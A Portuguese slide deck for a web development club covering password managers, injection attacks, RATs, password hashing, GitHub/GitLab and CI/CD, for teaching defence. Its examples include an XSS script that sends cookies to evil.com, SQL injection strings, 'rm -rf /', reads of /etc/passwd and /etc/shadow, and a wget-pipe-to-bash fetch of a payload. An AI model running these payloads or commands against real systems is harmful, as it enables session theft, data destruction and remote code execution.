---
marp: true
theme: default
paginate: true
style: |
  section {
    background-color: #ffffff;
    color: #1a1a2e;
    font-family: 'Segoe UI', 'Inter', sans-serif;
    padding: 52px 64px;
    font-size: 1rem;
    line-height: 1.6;
  }

  section::after {
    font-size: 0.72rem;
    color: #9ca3af;
  }

  h1 {
    color: #1a1a2e;
    font-size: 1.85rem;
    font-weight: 700;
    margin-bottom: 0.5em;
    letter-spacing: -0.02em;
    border-bottom: 2px solid #be123c;
    padding-bottom: 0.25em;
  }

  h2 {
    color: #6b7280;
    font-size: 0.85rem;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    margin-bottom: 0.3em;
  }

  h3 {
    color: #be123c;
    font-size: 0.95rem;
    font-weight: 700;
    margin-top: 1em;
    margin-bottom: 0.3em;
    text-transform: uppercase;
    letter-spacing: 0.05em;
  }

  p {
    margin: 0.4em 0;
  }

  code {
    background: #f3f4f6;
    color: #9d174d;
    padding: 1px 6px;
    border-radius: 3px;
    font-size: 0.87em;
    font-family: 'Consolas', 'Courier New', monospace;
    font-weight: 600;
  }

  pre {
    background: #f9fafb;
    border: 1px solid #e5e7eb;
    border-left: 3px solid #be123c;
    padding: 14px 18px;
    border-radius: 0 5px 5px 0;
    margin: 0.7em 0;
  }

  pre code {
    background: transparent;
    color: #111827;
    padding: 0;
    font-size: 0.8em;
    font-family: 'Consolas', 'Courier New', monospace;
    font-weight: 400;
  }

  strong {
    color: #1a1a2e;
    font-weight: 700;
  }

  em {
    color: #6b7280;
    font-style: italic;
  }

  blockquote {
    background: #fff1f2;
    border-left: 3px solid #be123c;
    color: #4b5563;
    padding: 10px 18px;
    border-radius: 0 5px 5px 0;
    margin: 0.8em 0;
    font-style: normal;
    font-size: 0.93em;
  }

  ul, ol {
    padding-left: 1.4em;
    margin: 0.3em 0;
  }

  ul li, ol li {
    margin-bottom: 0.4em;
    line-height: 1.55;
  }

  .columns {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 2.5rem;
    margin-top: 0.5em;
  }

  table {
    font-size: 0.79rem;
    width: 100%;
    border-collapse: collapse;
    margin-top: 0.6em;
  }

  th {
    background: #1a1a2e;
    color: #ffffff;
    padding: 8px 12px;
    text-align: left;
    font-weight: 600;
    font-size: 0.75rem;
    text-transform: uppercase;
    letter-spacing: 0.05em;
  }

  td {
    background: #ffffff;
    padding: 7px 12px;
    border-bottom: 1px solid #e5e7eb;
    color: #374151;
    vertical-align: top;
  }

  tr:nth-child(even) td {
    background: #f9fafb;
  }

  section.cover {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: flex-start;
    text-align: left;
    background: #ffffff;
    border-left: 6px solid #be123c;
    padding-left: 72px;
  }

  section.cover h1 {
    font-size: 2.7rem;
    color: #1a1a2e;
    border: none;
    padding: 0;
    margin-bottom: 0.2em;
    line-height: 1.2;
  }

  section.cover h2 {
    color: #be123c;
    font-size: 0.85rem;
    letter-spacing: 0.12em;
    font-weight: 700;
    margin-bottom: 1.2em;
  }

  section.cover p {
    color: #6b7280;
    font-size: 0.95rem;
    margin-top: 0.5em;
  }

  section.cover strong {
    color: #1a1a2e;
  }
---

<!-- _class: cover -->

## Clube de Desenvolvimento Web — Semana 2

# Seguranca na Web e Versionamento

*Senhas, ataques, criptografia, Git*

---

# Agenda

1. **Gerenciadores de senha**
2. **Tipos de injecao** — SQL, XSS, Dependencias, Payload
3. **Malware e backdoors** — RATs e conexao reversa
4. **Criptografia de senhas** — bcrypt, Argon2, SHA
5. **GitHub vs GitLab**
6. **CI/CD** — GitHub Actions e GitLab Pipelines

> "Seguranca nao e uma feature — e uma fundacao."

---

<!-- _class: cover -->

## Parte 1

# Gerenciadores de Senha

---

# Por que nao reutilizar senhas?

Uma senha vazada compromete **todas as contas que compartilham a mesma senha**

```
usuario@gmail.com : minhasenha123   <- vazou no site A
          |
          v
Atacante testa em: banco, email, redes sociais...
          |
          v
        Account takeover  (Credential Stuffing)
```

Esse ataque e automatizado — listas de credenciais vazadas sao compradas, vendidas e testadas em massa.

---

# O que e um Gerenciador de Senhas?

Um cofre criptografado que:

- Gera senhas **fortes e unicas** para cada servico
- Armazena tudo **criptografado** localmente ou na nuvem
- Exige que voce lembre apenas **uma senha mestre**

### Exemplos

| Ferramenta | Tipo | Destaque |
|---|---|---|
| **Bitwarden** | Open source | Gratuito, self-hostavel |
| **1Password** | Comercial | UX refinada |
| **KeePassXC** | Local | Sem nuvem, controle total |

---

# Como funciona internamente

```
Senha mestre  ->  [Derivacao de chave: PBKDF2 / Argon2]
                            |
                            v
                     Chave AES-256
                            |
                            v
               Cofre criptografado (.kdbx / vault)
```

- **Senha mestre** nunca e transmitida para servidores externos
- Cofre local = voce controla tudo
- Cofre na nuvem = sincronizacao com risco gerenciado

> Um gerenciador de senhas e um dos maiores ganhos praticos de seguranca que voce pode ter hoje.

---

<!-- _class: cover -->

## Parte 2

# Tipos de Injecao

---

# O que e um ataque de injecao?

Ocorre quando **entrada do usuario** e interpretada como **codigo ou comando** pelo sistema

```
Input esperado:   nome do usuario
Input recebido:   '; DROP TABLE users; --
```

O sistema nao distingue **dado** de **instrucao** — e executa o que recebeu.

---

# SQL Injection

Manipula queries diretamente no banco de dados

```sql
-- Query original
SELECT * FROM users WHERE email = '$email' AND senha = '$senha';

-- Input malicioso no campo email:
admin@site.com' OR '1'='1

-- Query resultante (condicao sempre verdadeira):
SELECT * FROM users
WHERE email = 'admin@site.com' OR '1'='1' AND senha = '...';
```

### Como prevenir
- Usar **prepared statements** — queries parametrizadas
- Usar ORM (TypeORM, Prisma, Hibernate)
- Nunca concatenar input do usuario diretamente em SQL

---

# XSS — Injecao no Navegador

**Cross-Site Scripting**: injeta JavaScript malicioso que e executado no navegador de outras pessoas

```html
<!-- Campo de comentario aceita qualquer texto -->
<input type="text" name="comentario" />

<!-- Atacante insere: -->
<script>document.location='https://evil.com/?c='+document.cookie</script>

<!-- Script e renderizado e executado no navegador das vitimas -->
```

### Consequencias
- Roubo de cookies e sessoes ativas
- Redirecionamento para paginas falsas
- Keylogging no navegador da vitima

### Prevencao
- Escapar HTML antes de renderizar: `&lt;script&gt;`
- Content Security Policy (CSP) no servidor
- Cookies com flag `httpOnly`

---

# Injecao de Dependencia — Supply Chain Attack

Diferente do padrao de design *Dependency Injection* —
aqui o risco e na **cadeia de fornecimento de pacotes**

```
npm install pacote-popular
       |
       v
  pacote-popular depende de um-pacote-menor
       |
       v
  um-pacote-menor foi comprometido por um atacante
       |
       v
  seu sistema executa codigo malicioso
```

### Casos reais
- **event-stream** (2018) — 2 milhoes de downloads, pacote infectado
- **colors.js** (2022) — autor sabotou o proprio pacote deliberadamente

### Prevencao
- Executar `npm audit` regularmente
- Travar versoes com `package-lock.json`
- Usar Dependabot ou Snyk para monitoramento continuo

---

# Injecao de Payload

Envio de dados maliciosos em qualquer campo de entrada da aplicacao

```json
// Corpo esperado pela API
{ "role": "user" }

// Payload enviado pelo atacante (Mass Assignment)
{ "role": "admin", "isVerified": true, "credits": 99999 }
```

### Outros vetores comuns
- **Path traversal**: `../../etc/passwd`
- **Command injection**: `; rm -rf /`
- **XXE** (XML External Entity injection)

### Prevencao
- Validacao rigorosa de tipos e valores
- Allowlist explicita de campos aceitos pela API
- Principio do menor privilegio em toda operacao

---

<!-- _class: cover -->

## Parte 3

# Malware e Backdoors

---

# O que e um RAT?

**RAT** — Remote Access Trojan

Programa que estabelece controle remoto de uma maquina para um atacante externo.

```
Vitima executa o programa
        |
        v
Maquina da vitima inicia conexao com o servidor do atacante
        |
        v
Atacante envia comandos  ->  maquina executa tudo
        |
        v
  qualquer comando do sistema operacional
```

Diferente de um virus, o RAT **nao se replica** — ele persiste silenciosamente e aguarda instrucoes.

---

# Como funciona a conexao reversa

```
[ Atacante ]                       [ Vitima ]
     |                                  |
     |  <--- conexao iniciada pela vitima ---|
     |                                  |
     |  ---> "ls /home" -------------->|
     |  <--- retorno do comando --------|
     |                                  |
     |  ---> "cat /etc/passwd" ------->|
     |  <--- conteudo do arquivo -------|
```

A **vitima inicia a conexao** — por isso atravessa firewalls sem disparar alertas.
O atacante escuta em portas comuns como 443 para parecer trafego HTTPS legitimo.

---

# Por que isso e perigoso

### `shell=True` com input nao filtrado

```python
# Toda string recebida vira comando do sistema operacional
subprocess.Popen(data, shell=True, ...)

# O atacante pode enviar:
"rm -rf /"                          # apaga tudo
"cat /etc/shadow"                   # extrai hashes de senha do sistema
"wget malware.com/payload -O- | bash"  # instala proximo estagio
```

Nao ha nenhuma validacao — **toda string recebida e executada com os privilegios do processo.**

---

# Como detectar e se defender

### Na rede
- Monitorar conexoes de saida inesperadas para IPs externos
- IDS/IPS (Intrusion Detection) — ex: Snort, Suricata
- Inspecionar trafego com Wireshark em ambientes suspeitos

### No sistema operacional
- EDR (Endpoint Detection & Response) detecta comportamento anomalo
- Auditar processos novos, `cron`, `~/.bashrc`, entradas de startup

### No codigo
- Nunca executar input externo como comando do sistema
- `shell=True` com dados externos e sempre um alerta critico
- Definir allowlist explicita de operacoes permitidas
- Rodar processos com o menor privilegio possivel

---

# Etica em Seguranca

> Compreender como ataques funcionam e essencial para construir defesas eficazes.
> Aplicar esse conhecimento contra sistemas sem autorizacao e crime.

### Lei brasileira — Art. 154-A do Codigo Penal
Invasao de dispositivo informatico alheio sem autorizacao:
**reclusao de 1 a 4 anos** + multa (agravado se houver dano ou obtencao de dados)

### Caminhos legitimos para praticar seguranca ofensiva

| Permitido | Proibido |
|---|---|
| CTF (Capture The Flag) | Atacar sistemas sem autorizacao escrita |
| Bug Bounty (HackerOne, Bugcrowd) | RAT em maquinas de terceiros |
| Pentest com contrato assinado | Acesso nao autorizado a qualquer sistema |
| Laboratorio proprio com VMs | Qualquer acao sem permissao explicita |

---

<!-- _class: cover -->

## Parte 4

# Criptografia de Senhas

---

# Por que nao armazenar senha em texto puro?

```
Banco de dados vazado:
+-------------------------------+---------------------+
| email                         | senha               |
+-------------------------------+---------------------+
| joao@email.com                | minhasenha123       |
| maria@email.com               | cachorro2024        |
+-------------------------------+---------------------+
```

Senhas devem ser armazenadas como **hashes** — nunca em texto puro nem criptografadas de forma reversivel.

> **Hash** e **criptografia** nao sao a mesma coisa.
> Hash e **unidirecional** — nao existe operacao de reversao.

---

# SHA — O que e por que nao usar para senhas

SHA (Secure Hash Algorithm) — familia: SHA-1, SHA-256, SHA-512

```python
import hashlib
hashlib.sha256("minhasenha123".encode()).hexdigest()
# "ef92b778bafe771e89245b89ecbc08a44a4e166c06659911..."
```

### O problema: velocidade

- SHA-256 processa **bilhoes** de hashes por segundo em GPU
- Tabelas rainbow pre-computadas ja cobrem hashes comuns
- Sem salt nativo — senhas iguais produzem hashes identicos

> SHA foi projetado para verificar **integridade de arquivos**, nao para proteger senhas de usuarios.

---

# bcrypt

Projetado em 1999 especificamente para hashing de senhas

```js
const bcrypt = require('bcrypt');

// Gerar hash com cost factor 12
const hash = await bcrypt.hash("minhasenha", 12);
// "$2b$12$Yz9qK1mVK8fRpH3..."

// Verificar senha
const ok = await bcrypt.compare("minhasenha", hash);
```

### Como funciona
- **Cost factor**: controla o tempo de processamento — quanto maior, mais resistente
- **Salt automatico**: gerado e embutido no hash resultante
- Baseado no Blowfish cipher, resistente a hardware especializado (ASICs)

### Limitacao
- Senha limitada a **72 bytes**
- Baixa resistencia a ataques com paralelismo de memoria

---

# Argon2

Vencedor do **Password Hashing Competition** (2015) — estado da arte atual

```js
const argon2 = require('argon2');

const hash = await argon2.hash("minhasenha", {
  type: argon2.argon2id,
  memoryCost: 65536,  // 64 MB de RAM exigidos por operacao
  timeCost: 3,        // 3 iteracoes
  parallelism: 4,     // 4 threads paralelas
});
```

### Variantes

| Variante | Uso recomendado |
|---|---|
| `argon2i` | Resistencia a side-channel attacks |
| `argon2d` | Resistencia a GPU (melhor performance) |
| `argon2id` | **Recomendado** — combina as duas abordagens |

---

# Comparativo: SHA vs bcrypt vs Argon2

| Criterio | SHA-256 | bcrypt | Argon2id |
|---|---|---|---|
| **Velocidade** | Muito rapido — ruim | Lento, configuravel | Lento, configuravel |
| **Salt automatico** | Nao | Sim | Sim |
| **Resistencia a GPU** | Fraca | Media | Alta |
| **Uso de memoria** | Minimo | Baixo | Configuravel |
| **Indicado para senhas** | Nao | Sim | Sim — melhor opcao |
| **Limite de tamanho** | Sem limite | 72 bytes | Sem limite |

> Para projetos novos, use **Argon2id**.
> Para sistemas com bcrypt, mantenha e ajuste o cost factor conforme o hardware evolui.

---

<!-- _class: cover -->

## Parte 5

# GitHub e GitLab

---

# Repositorios remotos

Git e local. Plataformas como GitHub e GitLab adicionam colaboracao e automacao:

```
Repositorio local  (git)
        |
        |  push / pull
        v
  Servidor remoto  ->  colaboracao, backup, CI/CD
```

- Historico completo de versoes do projeto
- Colaboracao via Pull Requests e Code Review
- Rastreamento de bugs e tarefas com Issues
- Automacao de testes e deploys

---

# GitHub

Fundado em 2008, adquirido pela Microsoft em 2018

### Pontos fortes
- Maior comunidade open source do mundo
- Interface acessivel para iniciantes
- **GitHub Actions** — CI/CD integrado e extensivel
- Marketplace com milhares de integracoes prontas
- GitHub Copilot (assistente de codigo por IA)

### Planos
- Gratuito: repositorios ilimitados, Actions com cota mensal
- Team / Enterprise: maior cota de CI, protecoes avancadas de branch

> Melhor escolha para projetos open source e portfolio pessoal

---

# GitLab

Fundado em 2011. Diferencial central: pode ser **auto-hospedado gratuitamente**

### Pontos fortes
- Self-hosted sem custo (GitLab Community Edition)
- CI/CD nativo desde o inicio — mais maduro e configuravel
- Plataforma DevOps completa: issues, wiki, container registry, monitoramento
- Controle total sobre dados e infraestrutura

### Planos
- Gratuito na nuvem com 400 minutos de CI/CD por mes
- Self-hosted: sem limite de minutos de CI

> Melhor escolha para times que precisam de controle total sobre dados e infraestrutura

---

# GitHub vs GitLab

| Criterio | GitHub | GitLab |
|---|---|---|
| **Comunidade OSS** | Muito grande | Menor |
| **Self-hosting** | Pago (Enterprise) | Gratuito (CE) |
| **CI/CD nativo** | Actions — flexivel | Pipelines — mais maduro |
| **Interface** | Mais simples | Mais completa |
| **Container Registry** | GitHub Packages | Integrado nativamente |
| **DevOps completo** | Parcial | Sim |
| **Assistente de IA** | GitHub Copilot | Experimental |

---

<!-- _class: cover -->

## Parte 6

# CI/CD

---

# O que e CI/CD?

**CI** — Continuous Integration: testar e integrar codigo automaticamente a cada mudanca

**CD** — Continuous Delivery/Deployment: entregar em producao de forma automatizada

```
git push
    |
    v
[CI]  Rodar testes  ->  lint  ->  build
    |
    v
[CD]  Deploy em staging  ->  producao
```

> Sem CI/CD: "funciona na minha maquina"
> Com CI/CD: "funciona em qualquer maquina, sempre, de forma verificavel"

---

# GitHub Actions

Arquivo de configuracao em `.github/workflows/ci.yml`

```yaml
name: CI Pipeline

on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - run: npm install
      - run: npm test
      - run: npm run build
```

---

# GitHub Actions — Conceitos principais

```
Workflow   ->  arquivo .yml em .github/workflows/
  |
  +-- Trigger  ->  on: push, pull_request, schedule...
       |
       +-- Job   ->  grupo de steps (VM isolada)
            |
            +-- Step  ->  comando shell ou Action reutilizavel
```

### Recursos relevantes
- Marketplace com milhares de Actions prontas para uso
- Execucao paralela de jobs configuravel
- Secrets armazenados com seguranca na plataforma
- Matrix builds: testar em multiplas versoes e sistemas

```yaml
strategy:
  matrix:
    node: [18, 20, 22]
```

---

# GitLab CI/CD Pipelines

Arquivo de configuracao em `.gitlab-ci.yml`

```yaml
stages:
  - test
  - build
  - deploy

testes:
  stage: test
  image: node:20
  script:
    - npm install
    - npm test

build:
  stage: build
  script:
    - npm run build
  artifacts:
    paths:
      - dist/

deploy_producao:
  stage: deploy
  script:
    - echo "Deploy em producao..."
  only:
    - main
```

---

# GitHub Actions vs GitLab CI/CD

| Criterio | GitHub Actions | GitLab CI/CD |
|---|---|---|
| **Arquivo de config** | `.github/workflows/*.yml` | `.gitlab-ci.yml` |
| **Maturidade** | Lancado em 2018 | Desde 2012 |
| **Runners self-hosted** | Sim | Sim |
| **Artifacts** | Sim | Sim — mais flexivel |
| **Marketplace** | Muito amplo | Mais limitado |
| **Integracao com infra** | Boa | Excelente (Kubernetes, etc.) |
| **Curva de aprendizado** | Menor | Maior |

---

<!-- _class: cover -->

## Recapitulando

# O que vimos hoje

---

# Resumo

<div class="columns">

**Seguranca**
- Gerenciadores de senha protegem com cofre AES-256
- SQL Injection — use prepared statements
- XSS — escape HTML, aplique CSP
- Supply chain — audite dependencias sempre
- Payload — valide e filtre toda entrada

**Criptografia**
- SHA — rapido demais, nao usar para senhas
- bcrypt — adequado, cost factor configuravel
- Argon2id — melhor opcao atual

</div>

---

# Resumo (continuacao)

<div class="columns">

**Malware**
- RAT estabelece controle remoto via conexao reversa
- shell=True com input externo e critico
- Defesa: menor privilegio, auditoria, IDS
- Conhecimento ofensivo serve a defesa — uso etico

**Git e CI/CD**
- GitHub — comunidade OSS, Copilot, Actions
- GitLab — self-hosted, DevOps integrado
- CI/CD elimina o "funciona na minha maquina"
- Automatize testes e deploy desde o inicio

</div>

---

# Desafio da Semana 2

### Nivel iniciante
Crie uma conta no GitHub, suba o projeto da semana 1 e escreva um `README.md` com descricao, instrucoes de uso e tecnologias utilizadas.

### Nivel intermediario
Configure um workflow no GitHub Actions que execute os testes automaticamente a cada `git push` na branch principal.

### Nivel avancado
Implemente autenticacao com Argon2 ou bcrypt, proteja as queries contra SQL injection com prepared statements e configure pipeline de CI com deploy automatico ao merge em `main`.

---

<!-- _class: cover -->

## Clube de Desenvolvimento Web — Semana 2

# Seguranca e habito, nao etapa

*Nao importa o nivel. Importa entregar — com responsabilidade.*
